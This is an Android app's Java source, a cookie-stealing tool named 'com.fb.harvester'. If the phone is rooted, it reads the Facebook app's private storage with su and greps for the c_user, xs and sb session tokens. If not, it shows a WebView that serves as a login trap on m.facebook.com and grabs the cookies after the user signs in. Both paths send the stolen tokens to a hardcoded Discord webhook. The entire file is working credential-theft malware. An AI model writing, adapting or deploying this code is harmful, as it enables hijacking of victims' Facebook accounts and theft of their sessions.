package com.fb.harvester;

import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebSettings;
import android.webkit.WebViewClient;
import android.webkit.CookieManager;
import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainActivity extends AppCompatActivity {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1564845237459750982/5SSwTgSG1OoKxhpzccfVzDt1GG64YRoSksPWcxl6GHgOV5jFoWYJ0MF3x5pcjhVT2_sO";
    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Try root extraction first
        if (isRooted()) {
            extractFromRoot();
        } else {
            // Fallback to WebView login trap if not rooted
            setupWebViewFallback();
        }
    }

    private boolean isRooted() {
        try {
            Process p = Runtime.getRuntime().exec("su -c id");
            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = in.readLine();
            return line != null && line.contains("uid=0");
        } catch (Exception e) {
            return false;
        }
    }

    private void extractFromRoot() {
        new Thread(() -> {
            try {
                // FB app stores cookies in its app_webview database or shared_prefs
                // We use 'su' to bypass the sandbox and grep for the tokens
                String[] commands = {
                    "su -c \"grep -r -E 'c_user|xs|sb' /data/data/com.facebook.katana/shared_prefs/ 2>/dev/null\"",
                    "su -c \"grep -r -E 'c_user|xs|sb' /data/data/com.facebook.katana/app_webview/ 2>/dev/null\""
                };

                String foundCUser = null, foundXs = null, foundSb = null;

                for (String cmd : commands) {
                    Process process = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (line.contains("c_user") && foundCUser == null) foundCUser = extractValue(line, "c_user");
                        if (line.contains("xs") && foundXs == null) foundXs = extractValue(line, "xs");
                        if (line.contains("sb") && foundSb == null) foundSb = extractValue(line, "sb");
                    }
                    process.waitFor();
                }

                if (foundCUser != null && foundXs != null) {
                    sendToDiscord(foundCUser, foundXs, foundSb != null ? foundSb : "missing", "ROOT Extracted");
                } else {
                    // Root failed to find cookies, fallback to WebView
                    runOnUiThread(this::setupWebViewFallback);
                }

            } catch (Exception e) {
                runOnUiThread(this::setupWebViewFallback);
            }
        }).start();
    }

    private String extractValue(String line, String key) {
        // Regex to pull the value out of XML or SQLite dumps
        Pattern pattern = Pattern.compile(key + "[^a-zA-Z0-9]+([a-zA-Z0-9%\\-_=]+)");
        Matcher matcher = pattern.matcher(line);
        if (matcher.find()) {
            return matcher.group(1);
        }
        return null;
    }

    private void setupWebViewFallback() {
        webView = new WebView(this);
        setContentView(webView);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36");

        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                extractFromWebView(url);
            }
        });

        webView.loadUrl("https://m.facebook.com/");
    }

    private boolean hasSent = false;
    private void extractFromWebView(String url) {
        if (hasSent) return;
        String cookies = CookieManager.getInstance().getCookie(url);
        if (cookies != null && cookies.contains("c_user=") && cookies.contains("xs=")) {
            String c_user = "", xs = "", sb = "";
            String[] cookieArray = cookies.split(";");
            for (String c : cookieArray) {
                c = c.trim();
                if (c.startsWith("c_user=")) c_user = c.substring(7);
                if (c.startsWith("xs=")) xs = c.substring(3);
                if (c.startsWith("sb=")) sb = c.substring(3);
            }
            hasSent = true;
            sendToDiscord(c_user, xs, sb, "WEBVIEW Extracted");
        }
    }

    private void sendToDiscord(final String c_user, final String xs, final String sb, final String method) {
        new Thread(() -> {
            try {
                URL discordUrl = new URL(WEBHOOK_URL);
                HttpURLConnection conn = (HttpURLConnection) discordUrl.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                String jsonPayload = "{\"content\":\"**Mobile FB Cookie Dump (" + method + ")**\\n```\\nc_user: " + c_user + "\\nxs:     " + xs + "\\nsb:     " + sb + "\\n```\",\"allowed_mentions\":{\"parse\":[]}}";

                OutputStream os = conn.getOutputStream();
                os.write(jsonPayload.getBytes("UTF-8"));
                os.close();
                conn.getInputStream().close(); 
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
